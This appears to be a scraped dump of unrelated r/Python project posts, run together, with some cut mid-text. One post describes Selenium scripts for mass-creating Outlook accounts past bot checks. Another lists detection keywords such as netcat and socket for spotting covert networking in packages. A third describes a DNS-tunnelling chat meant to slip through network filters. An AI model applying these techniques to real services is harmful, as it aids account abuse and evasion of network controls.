In [Part 2 (notebook)](https://github.com/mpkocher/Functional-Programming-Techniques-In-Python/blob/main/Functional-Python-Part-2.ipynb), we explore building a REST client using functional-centric design style. Using an iterative approach, we build up a REST client using small functions leveraging clsoures and passing functions as first class citizens to methods. To conclude, we wrap the API and expose the REST client via a simple Python class.

[Part 3 (notebook)](https://github.com/mpkocher/Functional-Programming-Techniques-In-Python/blob/main/Functional-Python-Part-3.ipynb) follows similarly to spirit to Part 2. We build a commandline interface leveraging `argparse` from the Python standard library. Sometimes libraries such as argparse can have rough edges or friction points in the API that introduce duplication or design issues. Part 3 focuses on iterative building up an expressive commandline interface to a subparser commandline tool using closures and functions to smooth out the rough edges of `argparse.`. There's also examples of using a Strategy-ish pattern with type annotated functions to enable configuring logging as well as custom error handling.

[Part 4 (notebook)](https://github.com/mpkocher/Functional-Programming-Techniques-In-Python/blob/main/Functional-Python-Part-4.ipynb) concludes with some gotchas with regards to scope in closures, a brief example of decorators and a few suggestions for leveraging function-centric designs in your APIs or applications.

I keep trying to dip my toes in other languages like Go, Rust, C, C++, or any other programming language under the sun, but everything is always uglier and more complicated, and it would be much easier to just implement things in Python. I suppose I am just frustrated at the moment because I need to learn Java and I am finding the syntax to be horrific in comparison. I mean just look at **THIS**

To  bring more bot operators into the subreddit, Ive prepared a Python  project/bot framework and Google Colaboratory notebook that will walk  you through getting a bot running on the subreddit.

The  framework has minimal level of functionality (for example it does  comments only, not posts/submissions) but a lot of the reliability  problems have already been solved so you dont have to worry about them.

The  project aims to guide you through the process from downloading Reddit  data, to fine tuning the GPT-2 model and then running the bot commenting  on Reddit.

The project is well  commented around the GPT-2 machine learning side, but less so on the  Python side. As such it is suitable for people with an intermediate  level of Python or determined beginners.

Advanced  Python users looking for a fun project are welcome to join, too. The  basic functionality offers a stable platform to build a more advanced  bot on.

If you have any more questions, please come and join us in the [r/SubSimGPT2Interactive](https://www.reddit.com/r/SubSimGPT2Interactive/) Discord ([https://discord.gg/JxTU2ky](https://discord.gg/JxTU2ky)). Or message me directly with your GitHub account name for access to the repository.

Skills you can learn:

* GitHub  Fork my project, merge commits from upstream, etc
* OpenAI GPT-2  The project requires you to prepare data and finetune a GPT-2 model
* Python threading  The project uses daemon threads to execute concurrent tasks
* SQLite/peewee ORM  The project uses an SQLite database with the Peewee ORM which is a very lightweight and easy to use ORM.
* praw  Python package for interacting with the Reddit API
* Deploying to a server  Ideally this project will run on a VPS or similar server

Future pathways:

If  you are more interested in the machine learning side of the project,  you can upgrade the GPT-2 model to something more powerful or combine it  with a different model (we are especially interested in bringing more  image submissions to the subreddit).

If  you are more interested in bot lolz than the machine learning side,  there is plenty of scope to improve the realism of the bot or upgrade  the framework to handle multiple bots.""|||Scrape Instagram data with instascrape|||Python|||1|||2|||1604016371|||""Hello!

&amp;#x200B;

I made this project a couple months ago, but never bothered promoting it, so here I am. The app is called **pastemngr**.

&amp;#x200B;

**What it is?**

Paste manager (pastemngr) is a command line tool for pastebin.com. By consuming the pastebin service API, this tool has the hability to create and retrieve pastes from the command line as well as fetching information regarding users and pastes (locally and online).

&amp;#x200B;

**Highlights**

One of the highlights of this program is that, when you post a paste under a username, the paste is also stored locally, so if it gets removed for any reason, you will still keep it in your local environment.

&amp;#x200B;

**Source code**

The source code can be found here: [https://github.com/pvpscript/pastemngr](https://github.com/pvpscript/pastemngr)

&amp;#x200B;

**Installation**

To install it, simply run: `pip install pastemngr`

&amp;#x200B;

**IMPORTANT**

In order to use the pastebin API, a developer key is required, so it's necessary that you create an account and get its dev\_key, so that the program can work properly. So, make sure to read the readme carefully before posting any questions.

**Note that the key is just to make this tool work, you can still publish pastes under the 'guest' user.**

&amp;#x200B;

My goal is to find the framework that better fits my (and maybe yours) needs:

* Easy performance metrics, artifacts (scalars, matrixes, images, ...), hyper parameters (a lot) tracking
* Maintainable (and possibly with cached steps) pipeline definition
* Data/models versioning
* Code versioning/diff (both commited code and not)
* Eventually with support/easy interface with a hyper parameters optimization framework

My research started after I added MLFlow tracking and multi-step code to my project, I've found the pipeline part a bit too convolved: requires additional controls if you want to check data changes for caching (and doesn't propagate the `--no-conda` flag) [Here](https://github.com/mlflow/mlflow/blob/master/examples/multistep_workflow/main.py) and [here](https://github.com/mlflow/mlflow/issues/1136) if you'd like to check what I'm talking about.

&amp;#x200B;

So I started watching video and reading docs, here's my summary about MLFlow, KubeFlow, Kedro, Allegro Trains:

&amp;#x200B;

* MLFlow (tested)
   * PRO: good metrics tracking but not perfect,  has a model serving feature. Maybe the easisest one
   * CONS: pipeline steps cache to be coded on needs, lacks a lot of data formats logging

&amp;#x200B;

* KubeFlow (didn't read much)
   * PRO: Perfect kubernetes integration
   * CONS: Good for pipelines, lacks tracking, lots of pods

&amp;#x200B;

* Kedro 
   * PRO:  provides abstraction for data sources and allow pipeline definition as node concatenation (step functions), very powerful
   * CONS: Slightly complex. 0 tracking, should be coupled with MLFlow. 
   * open points: Are steps cached based on code and data versioning?

&amp;#x200B;

* Kedro-mlflow - kedro plugin
   * PRO: Enables almost everything you might imagine, provides hooks to automatically track node parameters inside MLFlow
   * CONS: Power comes at a cost, adds complexity to Kedro

&amp;#x200B;

* Allegro 
   * PRO:  Lots of transparent features. Automatically hooks logging and storing functions  (e.g. `torch.save_model`), supports multiple data formats for logging (matrixes, pandas dataframes, plots,), has data and code versioning as well as uncommited code diffs, provides [Optuna](https://optuna.org/) integration, provides parallel pipeline steps API
   * CONS: pipeline steps are defined by running some code, scheduled by running other code. Executed who knows when. Pipeline are scheduled on a remote server which may live (I think) on your machine.

Now, for sure I missed a lot of stuff hiding in the multiple docs I've read, and for sure I'm missing some important feature as I've started recently looking into these frameworks,  but I'd like to hear from you who possibly have used one or more of these frameworks to update my findings and choose accordingly.

We might also write a guide to pick the best one based on some needs.

Overwatch is my fav game of all time and I clock heavy hours into it. If you play, you know that overwatch game queues have gotten pretty long and sometimes take 10+ minutes. I got sick of constantly waiting at my computer for games so I wrote this app to send a text message when a game is found.

Now for the code. This is a python 3.7 application. It uses pyautogui to poll your primary screen about once per second and checks if the game found message is present on your screen. It uses smtplib to send free text messages to your phone using your gmail account.

This app is not cpu intensive and can be run continuously in the background while you are gaming.

It is REALLY easy to use for the first time. Simple instructions are in the readme and I challenge you to get it running within 60 seconds on your computer!!

context on why i made this:

im using greenshot to capture screenshots and there is this function there that allows the creation of png images upon capturing the screenshot, but sometimes i just want my screenshot to be on my clipboard to just be sent on social media or just to paste on a word document and i dont want a png image copy..  

there is this function there also that just puts it in the clipboard but does not create a png image and sometimes i need a copy of the png image..  i got tired of opening paint and pasting the image there and then saving it.. 

so here i have created this very very very simple script that automatically converts the image in your clipboard to an png image.

so what i do is  i Put a hotkey to this file by using Windows' shortcut hotkey (for ex. ctrl + alt + q) by

1. Create a shortcut of the Python File
2. Go to the shortcuts' properties
3. Create a custom keyboard shortcut
4. Click apply and Ok

 so when i press ctrl + alt + q it just converts it and its on wherever the script is

Is it possible that I can tell the script that the mouse should wait x seconds before doing another action? If yes, that would be so huge, because I got the idea of automating some boring editing stuff.

Computing that is not easy and it usually involves a problem-specific recipe.

In the 1980'ies, Bradley Efron invented **the bootstrap**, a generic way to do compute confidence intervals with computers and pseudo-random numbers that works for **any estimator** applied to **any distribution**, from the lowly median to your trained convolutional neural net. Bootstrapping tools have been available in the R language for a long time, but with the  `resample` module you can now do bootstrapping and jackknifing in Python with efficient unit-tested pure Python implementations that require only `scipy` and `numpy`. Enjoy and leave a star if you like it!

Features

* Bootstrap samples (ordinary or balanced, both with optional stratification) of arrays with arbitrary dimension
* Parametric bootstrap samples (Gaussian, Poisson, gamma, etc.) of one-dimensional arrays
* Bootstrap confidence intervals (percentile or BCa)
* Jackknife estimates of bias and variance
* Randomization-based variants of traditional statistical tests (t-test, ANOVA F-test, K-S test, etc.)
* Tools for working with empirical distributions (cumulative distribution, quantile, and influence functions)

Quickle supports a subset of the Pickle protocol (along with a few extensions). For supported types, serializing using Quickle can be 2-15x faster than pickle. It's also usually faster/smaller than other available options (orjson, msgpack). For most applications your serialization library likely won't be the bottleneck, but if it does you might find quickle useful.

I don't know what to call this. I made it using pygame but it's not really a game because you don't actually interact with it. It's one of those things where you just sit back and watch it happen. I used to be somewhat experienced so I mostly did this to relearn all the things I forgot.

So basically it starts out with two squares, a red one and a white one. The red one stays in place while the other bounces around the screen until the two make contact. When that happens the red square changes its color and its position on the screen, and then another white square appears. Eventually it starts going absolutely crazy and the whole screen gets filled with those white squares. I'm also thinking about adding a genetic algorithm so that the white squares learn to "seek out" the red one. Almost like heat-seeking missiles.

I saw a [popular post](https://www.reddit.com/r/Python/comments/jhh8oa/monitor_your_internet_with_python/) using the Python `speedtest` module.  And that post reminded me of some problems I had with that module.  The main one was that, at the time I was using that module, it wasn't giving back correct speeds - this may have been fixed but I suggest you compare with other tools to verify the accuracy.  So I went on the hunt for something more accurate and found out that Ookla had recently released [a CLI version of their tool](https://www.speedtest.net/apps/cli).  There's no official Python module that I know of for it (yet), but it was much more accurate and provided more usable data - and you could dump it in machine readable formats.  Perfect!

That's because I needed to monitor a remote Internet connection for at least a month and be able to show the data in a reasonable format.  So, I came up with a solution using Grafana (visualization), InfluxDB (data store) and Python (Speedtest CLI controller and data parsing).  Wanting to easily be able to deploy this on a remote Raspberry Pi (this runs fine on a 3 if you're wondering) I opted to build the required Docker containers and orchestrate it all with Docker Compose.  I haven't touched the project in some months but I have plans to make some additions in the next week.

Feel free to [check out the project here](https://gitlab.com/splatops/cntn-speedtest).  If you have any issues feel free to report them as an issue or a PR if you're so inclined.

If you're interested in more projects like this I'm planning on doing things like this a few times a month.  If you have ideas of things to do using Python, along with other tooling, feel free to send me a note.

I can now easily install and manage standalone python applications in their own isolated environment.|||Python|||1|||3|||1603653920|||""I am not very familiar with node ecosystem so I am not familiar with npx but I see that pipx took inspiration based on that.

I think it's a really good idea for the specific use case that I think it solves. I was following PEP 582 with great interest, mainly because even though I think virtual environments are a great solution, we can do better to help out beginners.

Enter [pipx](https://github.com/pipxproject/pipx): 
It doesn't really do anything ground breaking, it relies on pip to install packages and venv to create an isolated environment.

**So why do we need pipx at all?**

You don't need pipx but it's so bloody convenient. There are cases where I need to install specific standalone python applications for a single user. I am still wary of breaking my environment if I just randomly start installing with `pip install my_application --user` or gasp: `sudo pip install my_application`.

So what I do is I painstakingly create an environment specifically for my_application. But then I have to activate it manually every time I want to use it. 

I can of course add an alias to my_application by specifically using the python corresponding to the application venv, but if I start installing multiple such applications I would have to start maintaining all these aliases myself. This is where pipx shines. It makes my_application available globally, but it is actually isolated in it's own venv.

**How do i use pipx?**:

I first install pipx for my specific user by doing `pip install --user pipx` or gasp: install it using the system package manager for all users.

Now if i want to install a standalone python application like say black i just use `pipx install black`. It will make the application available in ~/.local/bin which is once again convenient because I use that specific path to keep my local executable scripts so I have that in my path anyways :).

PS: I would be interested to hear about how you guys manage standalone python applications that you just want to consume, not develop or tinker with.""|||Simple Genetic Algo|||Python|||1|||2|||1603649568|||""I put together a script to estimate coefficients in a linear regression using a genetic algorithm, and wrote an entirely too lengthy blog post describing the code:

I have been using flask for almost all of my web projects over the past 5 years (at previous jobs and currently side projects). My latest app is [MaceyShop](https://maceyshop.com/), an e-commerce site.

Some highlights of the top-level app structure:

\- Libs folder: stay outside of the main web folder so that it can be reused in other frameworks (like starlette, pyramid or regular scripts). Current libs include sql\_db, nosql\_db, data storages (fs, s3, gcs), media managers (cloudinary, imgix). 

\- Main web folder: app factory, extensions, tasks, routing, templates, static, assets, utils, web core (decorations, template filters, middlewares etc). 

\- Jobs: background jobs

\- Settings folder

\- Scripts

\- Notes: jupyter notebooks for fast prototyping

\- Scrappy

\- Webpack configs

This is the app structure I used for all my projects, would love to see if any one wants to take a look and give feedback. If yes I will open source the base structure (with db, auth, ext setups)?

It's typically nearly half the effort for a database project.  It's also incredibly repetitive - you often get the feeling you're doing the same thing over and over.

You're right.  It's because backend logic follows patterns of "what" is supposed to happen.  And your code is the "how".  Suddenly, a simple cocktail napkin specification exposed into a massive amount of legacy code:

[Rules vs. Legacy Code](https://preview.redd.it/dfof9c146wu51.png?width=2854&amp;format=png&amp;auto=webp&amp;s=d30275dc07d9dbb4b945cd199e2415224dfb7846)

Learn how Logic Bank introduces rules that are 40X more concise than legacy code.  That's because rules are all about "what", spreadsheet-like expressions that automate the tedious "how".

Logic Bank is fully integrated with Python.  It's used to state your rules, and provide extensibility and manageability.  With Logic Bank, your cocktail napkin specification becomes executable, like this:

They were using some unpopular mail servers and I thought if I want to do it then I want to do it big. The major two seem to be gmail and outlook. I opened gmail in incognito and clicked sign up. The sign up form asks for mobile number. Then I checked outlook. Outlook just asks to solve a captcha. So, I stepped down a bit and thought lets "semi-automate" it. 

Selenium will do all the boring stuff like writing names and choosing passwords. I, a human will do the challenging part. Solving a captcha. 

You can check the code, it has all the regular selenium stuff like finding element - clicking it or typing on it. There is a library names to create random names with which can sign up with. There are libraries random\_username and password\_generator as well.

Now, as high my aim could be, it was to create thousands of accounts. So, added code to append credentials to csv.

	`row2={"dob_date":user_date,"dob_month":user_month,"dob_year":user_year,"fname":user_fname,"lname":user_lname,"password":user_password,"username":user_username}`

`df=pd.read_csv("outlook.csv").set_index("id")`

`df=df.append([row2])`

`df.index.name="id"`

`df.to_csv("outlook.csv")`

Done! Now, I was hoping that yeah I'm gonna be the king of email accounts.

Sadly, outlook was able to catch selenium somehow. After making 2 accounts, it started asking for phone number to verify that you are human. It changed its sign up steps after detecting it. Earlier it was asking to solve captcha. Now, it is asking to write down phone number and verify using OTP. A kid tried to be smart with the tools that he has. The master has shown who is the real boss.

And now here I am again to square 1. Thinking about how to automate mail account creation. 

Code files:

outlook\_generate.py : [https://www.codepile.net/pile/xX13Rb8q](https://www.codepile.net/pile/xX13Rb8q)

help core credentials\_generator.py : [https://www.codepile.net/pile/xX13Rb8q](https://www.codepile.net/pile/xX13Rb8q)

(Mods, feel free to delete my post if it violates a rule - it isn't a "how do I do this in Python"-sorta question, so I figured it might be allowed)

I'm currently working on a proof-of-concept for establishing trust in Python projects based on, among other things, static analysis of the code. 

One of the situations I'd like to detect is network activity, or intended at least. This is to prevent typo-squatting scenarios, where simple, innocent looking packages transmit data over a network. Note that this is still just a concept and it does not need to be 100% dilligent. 

In short, i'd like to analyse source code and determine whether or not it's likely to establish a connection to an outside network of some sort. 
Plenty of Python packages rely on benign networking, but the point is to help determine whether or not a package that really **shouldn't** do any networking (like a package that converts FLAC to MP3), in fact does transmit data. Whether or not a package should network is up to the user, I'm only interested in detecting networking of all sorts.

The idea is a simple scan of the source code, to which I turn to /r/python for help with **keywords**. This is what I have so far (rudimentary, I know):

* scapy
* socket
* iptables
* subprocess
* ssh
* netcat
* regex for hardcoded IP addresses
* urllib

What other keywords do you suggest I look for?  I'm also scanning any shell scripts for socket stuff, but for know I'm focusing on Python.

Check out her repo, and try it out yourself!|||Python|||1|||0|||1603432820|||""My friend, /u/majoburo, just finished making a Color Magnitude Diagram viewer!

&amp;#x200B;

https://preview.redd.it/jhrvw1j8bsu51.jpg?width=1125&amp;format=pjpg&amp;auto=webp&amp;s=7761914588291f444a094cb6d03d2005dd11945f

If you aren't familiar with a color-magnitude diagram, it's a tool in astronomy for organizing stars by brightness and temperature. Brighter stars are towards the top, and higher-temperature towards the left. As a star ages, its location in the diagram typically moves in a path called the main sequence.

Her tool is written in Bokeh and displays the spectrum of each star with data available.

You can try it out here: [https://majoburo.github.io](https://majoburo.github.io)!

Here are some things to look for, from her repo ([https://github.com/Majoburo/INTERACTIVE\_HR](https://github.com/Majoburo/INTERACTIVE_HR)):

## PLOT DESCRIPTION

The axes in the "HR" (for [Hertzsprung Russell](https://en.wikipedia.org/wiki/Hertzsprung%E2%80%93Russell_diagram)) plot are actually color and absolute magnitude, normally referred to as a color-magnitude diagram. The y-axis corresponds to luminosity and the x-axis corresponds to temperature. Left to right is hotter to colder, bottom to top is dimmer to brighter. The bottom plot is the spectrum of the star under your cursor. It's the intensity of each wavelength of light emitted by the star.

## COOL FEATURES

* Most stars have a [black body emission curve](https://en.wikipedia.org/wiki/Black_body) and [absorption lines](https://en.wikipedia.org/wiki/Spectral_line) on top due to cooler atmospheric layers outside of their hot cores. Some of them even have emission lines due to a hotter exterior! Can you identify the ones that do? What do they have in common?
* Notice the main blob that goes from bottom right to top middle. This is the [main sequence](https://en.wikipedia.org/wiki/Main_sequence). As stars age, they move up the main sequence.
* Look at the bottom left corner. Those are the spectra of [white dwarfs](https://en.wikipedia.org/wiki/White_dwarf). They have clear, broad lines, compare them with other stellar spectra in the main sequence. The lines in white dwarfs are broader. White dwarfs have higher surface gravity, which means they have higher pressures, which scatters the electrons around and broadens their lines. The lowest white dwarfs are cooler and have narrower (or even hidden) absorption lines.
* Looking at the main sequence: Stars with lower temperatures are redder, to the right, and stars with higher temperatures are bluer, to the left. Lower temperature stars have more molecular aborptions lines, which are much wider dips than element lines. Can you identify them? They correspond to red dwarfs within the main sequence.
* Look at the spectra of white dwarfs and then that of red dwarfs (the bottom part of the main sequence). Now look at the spectra between them. These are likely binaries of the two kinds of stars :).
* Look up the [Balmer series](https://en.wikipedia.org/wiki/Balmer_series). It's the series of atomic transitions of hydrogen. Can you identify the lines in the spectra? Which stars have clearer hydrogen lines? Why do you think that could be?
* There is a star within the white dwarfs that has splitting on both sides of the Balmer series lines. This is likely a heavily magnetized star. Can you find it?""|||How to remove "none" from output?|||Python|||1|||2|||1603425832|||""[removed]""|||Please try the cool Command-line bound Messaging Service I created using WebSockets, Fernet Cryptography, Asyncio and Prompt Toolkit!|||Python|||1|||0|||1603424604|||""Find it here [https://github.com/t0xic0der/sanctuary-zero/](https://github.com/t0xic0der/sanctuary-zero/).

Sorry for the lack of comments and slightly messy syntax, it's really a very basic use of matplotlib's pyplot API. If you've never come across matplotlib you can read up on it here [https://matplotlib.org/](https://matplotlib.org/)

The graph is just a demonstration of the binomial distribution, and shows that the more times you flip a coin, the more likely you are to get close to the 50% heads you'd expect.

To put it bluntly, the official way to check your ballot(s) status in the state of Georgia is not great. It struggles to deal with situations where you have multiple ballots because one has been rejected for whatever reason. A friend was having issues trying to see if his most recent ballot had been accepted, [so I decided to take matters into my own hands](https://georgia-voter-frontend.herokuapp.com/).

All Georgia absentee and early voter information is publicly available (glad to share the URL or you can check within the data_import.py function in the fastapi_voter_project), so I decided to make a simple little API to allow for more easy viewing of your voter information.

**Note:** I am a cheap human being unwilling to pay for the service to keep the container API running all the time on Heroku, so if the results take longer than expected to return it's because that container is resuming from a stopped state.

**Backend**

[Project Link](https://github.com/theBusBoy/fastapi_voter_project) 

Initially, I built out the API capabilities in flask (as it's what I'm most familiar with), but when I began containerizing it I became aware of [FastAPI](https://fastapi.tiangolo.com/) for the first time. Since this was just a casual hobbyist project, I decided that now was a better time than ever to try out a new api framework.

FastAPI will likely become my new standard for API building as I thoroughly enjoy many of the conventions/framework paradigms it follows. For anyone wanting to learn more, the tutorial on the site is phenomenal.

While I usually do all database work in Postgres, I initially just planned for this to be a nice little tool for myself and figured that sqlite would be fine for my use case as I'm really just querying a denormalized output csv from the state. I will say that I don't have much experience with sqlite, and if this weren't just a "5 day build it and leave it" project I absolutely would migrate this to Postgres or MariaDB.

**Frontend**
[Project Link](https://github.com/theBusBoy/voter_project_frontend)

I loathe frontend work mostly because I hate javascript and (stubbornly) refuse to learn typescript (and I'm also trash). Maybe one day I'll stop this behavior but for now you get to see another react-bootstrap baby's first react app implementation. 

If someone who enjoys javascript and react wants to refactor HomePage.js and VoterCard.js to not be a blight on society I'm all for it.

**Deployment**
I normally do all of my personal project work in AWS (because it's what I have to do all my professional work in), so I decided to change it up this time and do a fully dockerized deployment on Heroku. I like Heroku as a platform, and I understand their constraint where ports for apps are assigned at runtime, but it was an absolute pain in the ass for someone who isn't as familiar with docker (and especially dockerizing react apps) to inject the environment variable port at runtime. This whole post gets made yesterday instead of today if I was able to find better resources about this, and eventually I just struck gold and adapted OKTA's [article](https://developer.okta.com/blog/2020/06/24/heroku-docker-react) to make it work. I'm a data engineer by trade who usually gets to sit within my comfy databricks or other SaaS DE tools, so I'm pretty proud of myself for navigating the docker world to make this thing happen.""|||I have made a bot that Tweets a Hadith every hour|||Python|||1|||0|||1603381397|||""This is basically a GitHub action scheduler that calls API to get a Hadith and post a Tweet in twitter.

Then with some friends I joked about using DNS queries+answers to create a chat app, because those packets are (very often) left unfiltered on any networks.

That's how I started writing a small proof of concept, making use of the answer field of the reply packet to store server messages, and of the qname field of the query to send client message, and here I'm with a basic client to server "messaging" application, only by using scapy and some researches on Internet.

The best part for me with this project is learning how a DNS request/reply is structured, since my field of study is networking (I'm not done with uni yet).

I created a script that was inspired by u/harshi_bar to automatically apply to jobs and a script that scrapes a webpage for jobs pertaining to the location and title of your choice. It currently only works for companies that have their job listings on Greenhouse because creating an autofill for every job out there is just impossible, but enough people use Greenhouse to make it worth it. 

So I know I'm a little late to the game with auto-apply-to-jobs scripts ([https://www.reddit.com/r/cscareerquestions/comments/jf3w1g/apply\_to\_90\_software\_internships\_with\_one\_click/](https://www.reddit.com/r/cscareerquestions/comments/jf3w1g/apply_to_90_software_internships_with_one_click/)) but wanted to share my project anyways in case anyone wanted to turn it into something even better. It appears u/kaafar's Quick Apply had the same idea - you can also easily turn mine to work for Lever. My script comes with 100+ precompiled company URLs to scrape, but I can provide a similar amount of Lever URLs if you're interested as well just pm!

Also before anyone decides to comment that this will make it harder for everyone else and take away any advantages etc., not every application asks for just the basics. There are some (most nowadays) that require you a more unique answer such as your reason for applying. So it's not the end of the world! Let's just all live happily ever after :)

Hello, I wanted to share this project that I've been working on for a couple of days. I wanted to experiment with web-scraping, so I looked up some resources for BeautifulSoup4.

The database runs in the command line and it's pretty straightforward. It pulls from this table: https://en.wikipedia.org/wiki/List_of_largest_cities#List and creates a data set from the columns. You can search by population or any other category present in the wikipedia table, and this feature is generated dynamically. You can also search for a city by name and if it's present in the table then the program will return its statistics, as well as opening the city's wikipedia page to give you the first few paragraphs from the entry. 

Incidentally, if you happened to be looking to make something using BS4, then I found this video very helpful: https://www.youtube.com/watch?v=XQgXKtPSzUI

Live Demo: https://www.reddit-lean.com/

The backend of this webapp uses Python's Sci-kit learn module together with the reddit API, and the frontend uses Flask.

This classifier is a logistic regression model trained on the comment histories of &gt;20,000 users of r/politicalcompassmemes. The features used are the number of comments a user made in any subreddit. For most subreddits the amount of comments made is 0, and so a DictVectorizer transformer is used to produce a sparse array from json data. The target features used in training are user-flairs found in r/politicalcompassmemes. For example 'authright' or 'libleft'. A precision &amp; recall of 0.8 is achieved in each respective axis of the compass, however since this is only tested on users from PCM, this model may not generalise well to Reddit's entire userbase.""|||Made a Python script that draws in Drawise, Scribble etc|||Python|||1|||0|||1602961903|||""Just enter the object to draw and it will draw automatically.

I used Requests, BeautifulSoup and CSV imports. The program first searches for the number of pages, then extracts the data and put them into a file.

A very simple **program** to grab **images** with the mouse.

I am quite new to Python and I'd like to setup a template app that run a Plotly Dash app running inside docker.

So far I made created most of my Python scripts within Dataiku as a part of a major data prep workflow.

For my the new concept, the idea is to:

1. Data Prep (Python, Numpy, Pandas): Jupyter Notebook
2. Programming Plotly Dash App: IDE like e.g. PyCharme
3. Docker Create files in any kind of Text Editor.

Is it too complicated? Are there maybe better alternatives? 

How would you do the setup?

I would like the MIN value of this string to represent a character value in the WAV file of: -32767

And the MAX value of this string to represent a character value in the WAV file of: 32767

This will normalize the amplitude of the WAV file to 100% for this particular string.

Then it should assign a value for each character so that:

ASCII 117 =&gt; 32767

I am an intermediate level python programmer (\~2 years in, 1 year working full time), and I recently started a new job as a Data Analyst for a large logistics company. Even though my title is Data Analyst, Most of what I've been doing has been automation, which the company desperately needs. Anyway, I've wrote some scripts to automate the formating and analysis of various files, mostly csv and xlsx. So far everything is good and people seem to really appreciate my work. However, at my last job, which was an internship at a small financial company, I made a lot of similar scripts that often had problems because the input files changed in some way. Sometimes it could be that the columns were order differently, or a column name was spelled differently, or the data in the columns was in a different format, etc. I was wondering if there was any libraries/packages/modules that deal with this specific problem and point the problems out, and perhaps even correct them. I have done some light googling but I don't really know what to google and thus my searches produced basically nothing.  I asked a Data Scientist on my team (the position above mine on the Data team), and he said he didn't know of any. 

&amp;#x200B;

I'm sure there is something out there that does this sort of thing, but I was also thinking of writing my own module. In that case, I would like to write a module that is general enough to use for a variety of scripts/files, although I would probably focus on xlsx/csv files at first. I was thinking I could improve on it over the course of my career, and perhaps add in some machine learning/AI later since I am in the beginning stages of learning those techniques now.

&amp;#x200B;

If anyone has any libraries/packages/modules that deal with this sort of issue, I would really appreciate it if you could link it in the comments. Likewise, I would also really appreciate some input on how I could go about designing a module for this myself.

Few days into my learning, I've been tasked to provide the switch(ports) where the APs are connected at one of our customer's site. Not a big deal, but still, if it can be automated, why not. Especially if I want to collect more information about the APs, then in can take a bit more time to collect and organize all data.

So, in a few days I've google-fu'd again a script, which collects some AP related data from different show commands, and create an excel sheet with the output. I'm sure the code is far from pretty, and probably some weird WLC output can confuse it, but so far it works.

I'd appreciate any comments about improvements, ideas, suggestions.

As there is no Python installed on the windows jumpserver, I'm creating a standalone .exe with pyinstaller, and running it that way. For some reason it takes few minutes for the program to actually starts, I don't know why, maybe it's setting up the Python environment, but still, it takes a lot of time. Maybe that can be improved somehow?

What I'd like to do more is to add an option for using an SSH jumpserver.

Thank you for your time :)

I love last.fm. Im a bit of a quantified-self nerd, so if theres data to be gleaned about my habits Im all for it.

With that it mind, I set out to download all my historical Last.fm data, but it turns out theres no way to do so. Foiled! Except their API doesnt seem to care so much, so lets use that.

The full code for this is available on GitHub, and I suggest cloning it first.

A word of warning: I have 55,646 scrobbles at the time of writing and it took 11m13s, so expect it to take some time.

Gist of write up:

I use Last.fm's API, which allows you to download scrobbles from any point in history, unlike their webui, then use Pandas to produce a CSV with artist, album, track, date listened etc.. With the CSV you can do some pretty cool stuff:

* See what your listening habits were at a particular point in time
* See what your all-time favourite bands and songs are
* See if there was a dip or rise in your listening and correlate it to real-life events.

Please check it out and feel free to ask questions!

I think it's a nice simple project to illustrate working with an API and transforming data from that API into a format you can do cool things with.

Many people, friends, and family mostly, have come to me over the years wanting to learn how to code and wanted me to teach them. From those experiences and just reading over the Internet, the biggest thing I see when people trying to learn a new language or getting into programming is information overload and then giving up on the entire process. I wanted to come up with a unique way to try and avoid this, and I think I may have found something - newsletter format.  
Newsletters are hot right now in the business and tech industry but thought it would be great for teaching a programming language. So that is what I did - started a newsletter where each week I send out a newsletter advancing from the week before. So week 1, it's the basics - getting everything installed and running, then week 2 we go into the basics of programming and continue to advance each week.  
I did it this way to try and not information overload my subscribers. I try to provide the right amount of information where they can't read it in 5 minutes, but they also don't have to spend 20 straight hours trying to learn a programming language. I try to aim for 1 hour of content and then if subscribers want more content I provide links to additional resources.  


The goal is to teach the fundamentals in 4 months so the subscribers have a really good understanding of the language and can then go out in the world and start developing real projects. I got really good feedback after sharing this idea around Reddit, Facebook, and Twitter and have just released the first newsletter article today. If you are a code newbie wanting to learn Python, go check it out and subscribe if you'd like! I think you'll learn a lot along the way.

Both languages possess different philosophies, came around the mid-90s to address various needs in the programming community. Theyre both flexible, object-oriented languages, dynamic, and have a lot of different functionalities, required to empower web development.

Both frameworks provide views, controllers, and models to power your web application and an API that offers endpoints to address your needs.

When you are planning your new web development project this 2020, choose a framework that can provide every tool you need. And both Ruby and Python seem to be the perfect answer to these specific web development needs.

In Conclusion

After doing this Ruby Vs Python comparison, one thing is clear that both are equally capable, which language is better for your project, that is the main deciding factor ultimately. In fact, many of the changes and new features in Python are first tested in Ruby.

If you are looking at only building web applications, then consider Ruby on Rails. On the other hand, if you are interested in building web applications but would like to also learn a language thats widely applicable and proficient with handling data analytics than Python is the best bet.

Also, when looking to add more features to your web application, like machine learning or other areas, Python is a perfect choice as it has libraries that support other fields.

Ruby focuses on giving developers the freedom to do whatever they want and staying out of their way, whereas Python developers are somewhat conservative and value stability over change. (developments and new features are slowly added)

Both Ruby and Python are fast and simple programming languages. For projects that include a lot of data computing, processing, and analytics, Python is probably the best option. However, Ruby suits projects that are traffic-heavy and involves rapid prototyping.

TLDR: Own 100% of an AI SAAS startup. 

AND be part of a great co-founding team. 

How? We build a stellar product together with all team members in different countries &amp; languages. 

Then you own it 100% in your home country's language.

\#### 

&amp;#x200B;

Dear everyone,

Are you ambitious with some Django knowledge? 

Looking to build a future-proof AI SAAS startup and maximize your own profit?

In addition: How would you feel if you owned 100% of it in the end?

&amp;#x200B;

Sounds great but how on earth would this happen to you, except for an incredible opportunity mixed with massive amounts of luck?

&amp;#x200B;

I thought extensively about this. This is what I found: 

\- Solo-Founders have extremely low odds of success. No wonders. They compete against whole teams. Almost nobody master all the different expertises needed. And it takes a huge amount of work, sustained effort to make it.

\- Co-Founders can be the best thing ever. But opportunity windows are short and it is hard to find the right ones at the right time. Finally, you bet your work and equity on them. Bad co-founders can mean losing control, profit share or the whole work you did for a company.

&amp;#x200B;

I came up with a possible solution. A way in which you could, as a Solo-founder, own 100% of your business. But work together with like-minded founders on your startup, who all have a direct personal incentive to make your startup successful and profitable.

Localization.

I believe we can work together, on the same product, but for different languages &amp; countries. Sharing code, different expertises, support and great times together. Owning 100% of our business at home.

I believe that this will dramatically improve everyone's odds of success. Everyone's interest would be to make everyone successful. All work is easier within a dynamic &amp; competent fellowship.

Obviously members will have to be well selected &amp; aligned to ensure success. And there could be new types of problems arising. But as founders, solving problems is what we do. So we'll figure it out.

Overall, I think this is super worthy of a try. 

&amp;#x200B;

Especially when the top risks are : maybe waste a few hours if we don't see it working.

